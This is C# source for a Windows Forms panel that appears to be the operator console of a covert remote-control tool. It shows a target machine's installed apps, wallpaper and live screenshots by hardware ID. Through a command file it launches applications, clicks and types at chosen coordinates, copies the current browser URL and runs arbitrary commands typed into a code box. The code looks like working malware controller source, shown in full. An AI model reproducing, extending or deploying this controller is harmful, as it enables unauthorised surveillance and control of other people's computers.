using System;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MasterForm
{
	public partial class Desk : Form
	{
		public Desk()
		{
			InitializeComponent();
			string hwidik = File.ReadAllText("C:\\master-server\\temphwid.txt");
			this.Text = "Controlling " + hwidik;
		}

		void Desk_Load(object sender, EventArgs e)
		{
			string hwidik = File.ReadAllText("C:\\master-server\\temphwid.txt");
			Thread.Sleep(30);
			this.Show();
			try { richTextBox1.Text = File.ReadAllText($@"C:\master-server\public\{hwidik}\yarliksdata.txt"); } catch { }
			
			try
			{
			pictureBox2.ImageLocation = $@"C:\master-server\public\{hwidik}\wallpaper.jpg";
			pictureBox2.Image = RotateImage((Bitmap)pictureBox2.Image, 7);
			}
			catch
			{
			}
			
			try //display installed apps as a table
			{
				string contents = File.ReadAllText($@"C:\master-server\public\{hwidik}\appsdata.txt");
				string hello = "ИМЯ,ВЕРСИЯ,ИЗДАТЕЛЬ,ID,OWNR,КМПН,LNG,SSISI,NUMBA,HL,ЛОКАЦИЯ,ИСТОЧНИК,DT,CTC,CM,IM,UIRL";
				hello += "\n" + contents;
				string[] Lines = hello.Split('\n');
				string[] Fields;
				Fields = Lines[0].Split(new char[] { ',' });
				int Cols = Fields.GetLength(0);
				DataTable dt = new DataTable();
				for (int i = 0; i < Cols; i++)
					dt.Columns.Add(Fields[i].ToLower(), typeof(string));
				DataRow Row;
				for (int i = 1; i < Lines.GetLength(0); i++)
				{
					Fields = Lines[i].Split(new char[] { ',' });
					Row = dt.NewRow();
					for (int f = 0; f < Cols; f++)
						Row[f] = Fields[f];
					dt.Rows.Add(Row);
				}
				dataGridView1.DataSource = dt;
				Task.Delay(666);
				Thread.Sleep(666);
				try
				{
					dataGridView1.Columns["LNG"].Visible = false;
					dataGridView1.Columns["OWNR"].Visible = false;
					dataGridView1.Columns["ID"].Visible = false;
					dataGridView1.Columns["UIRL"].Visible = false;
					dataGridView1.Columns["IM"].Visible = false;
					dataGridView1.Columns["CTC"].Visible = false;
					dataGridView1.Columns["NUMBA"].Visible = false;
					dataGridView1.Columns["SSISI"].Visible = false;
					dataGridView1.Columns["HL"].Visible = false;
					dataGridView1.Columns["DT"].Visible = false;
				}
				catch
				{
				}
			}
			catch
			{
			}

            Thread WindowUpdaterEverySecond = new Thread(delegate () //background thread that refreshes images
            {
                for (; ; )
                {
                    try
                    {
                        Thread.Sleep(333);
                        pictureBox3.ImageLocation = $@"C:\master-server\public\{hwidik}\screen.jpg";
                        pictureBox1.ImageLocation = $@"C:\master-server\public\{hwidik}\shota.jpg";
                    }
                    catch
                    {
                    }
					if (!File.Exists("C:\\master-server\\temphwid.txt")) { Thread.CurrentThread.Abort(); } //exit when not needed
                }
            });
            WindowUpdaterEverySecond.Start();
        }

		void button1_Click(object sender, EventArgs e) //launch button
		{
			//generating window preview size:
			string[] blya = textBox4.Text.Split(',');
			pictureBox1.Width = int.Parse(blya[0]);
			pictureBox2.Height = int.Parse(blya[1]);

			//disabling unneeded buttons:
			textBox1.Enabled = false;
			textBox2.Enabled = false;
			textBox4.Enabled = false;
			textBox7.Enabled = false;
			textBox7.Enabled = false;
			button1.Enabled = false;

            MakeCommand($@"execute,{textBox1.Text},{textBox2.Text},,{textBox4.Text},{textBox7.Text}");

			Thread.Sleep(9999);
			tabControl1.SelectedTab = tabPage2;

		}

		Bitmap RotateImage(Bitmap rotateMe, float angle)
		{
			try { File.Delete("rotated.png"); } catch { }

			var bmp = new Bitmap(rotateMe.Width + (rotateMe.Width / 2), rotateMe.Height + (rotateMe.Height / 2));
			using (Graphics g = Graphics.FromImage(bmp))
				g.DrawImageUnscaled(rotateMe, (rotateMe.Width / 4), (rotateMe.Height / 4), bmp.Width, bmp.Height);

			bmp.Save("moved.png");
			rotateMe = bmp;
			Bitmap rotatedImage = new Bitmap(rotateMe.Width, rotateMe.Height);

			using (Graphics g = Graphics.FromImage(rotatedImage))
			{
				g.TranslateTransform(rotateMe.Width / 2, rotateMe.Height / 2);
				g.RotateTransform(angle);
				g.TranslateTransform(-rotateMe.Width / 2, -rotateMe.Height / 2);
				g.DrawImage(rotateMe, new Point(0, 0));
			}
			rotatedImage.Save("rotated.png");
			return rotatedImage;
		}

		void pictureBox3_Click(object sender, EventArgs e) //click picture to update screenshot
		{
            MakeCommand("allwinshot,please");
        }

		void pictureBox1_Click(object sender, EventArgs e) // on click on window coordinates
		{
			MouseEventArgs me = (MouseEventArgs)e;
			Point coordinates = me.Location;
			MakeCommand(@"clickandtext,X" + coordinates.X.ToString() + " Y" + coordinates.Y.ToString() + "," + textBox3.Text);
			textBox3.Text = "";
		}

		void MakeCommand(string WhatToSend) //function to send commands
		{
			string hwidik = File.ReadAllText("C:\\master-server\\temphwid.txt");
			Thread.Sleep(3);
			try { File.Delete($"C:\\master-server\\public\\{hwidik}\\current.command"); } catch { }
			File.WriteAllText($"C:\\master-server\\public\\{hwidik}\\current.command", WhatToSend);
			Thread.Sleep(888);
		}

		void button4_Click(object sender, EventArgs e) // "copy current URL" button
		{
            string hwidik = File.ReadAllText("C:\\master-server\\temphwid.txt");
            MakeCommand("copylink,please");
			Thread.Sleep(333);
			try { Process.Start($"C:\\master-server\\public\\{hwidik}\\clip.txt"); } catch { }
		}

        void button8_Click(object sender, EventArgs e) { textBox3.Text += "{Esc}"; }
        void button3_Click(object sender, EventArgs e) { textBox3.Text += "{Enter}"; }
		void button5_Click(object sender, EventArgs e) { textBox3.Text += "{BS}"; }
		void button6_Click(object sender, EventArgs e) { textBox3.Text += "{WheelUp}"; }
		void button7_Click(object sender, EventArgs e) { textBox3.Text += "{WheelDown}"; }
		void button9_Click(object sender, EventArgs e) { textBox3.Text += "{Up}"; }
		void button10_Click(object sender, EventArgs e) { textBox3.Text += "{Down}"; }

        void button2_Click(object sender, EventArgs e)
        {
            MakeCommand(CodeBox.Text);
        }

        void Desk_FormClosed(object sender, FormClosedEventArgs e) //on exit
		{
            string hwidik = File.ReadAllText("C:\\master-server\\temphwid.txt");
            MakeCommand("nothing");
            Thread.Sleep(10);
            File.Delete("C:\\master-server\\temphwid.txt");
			
		}

	}
}
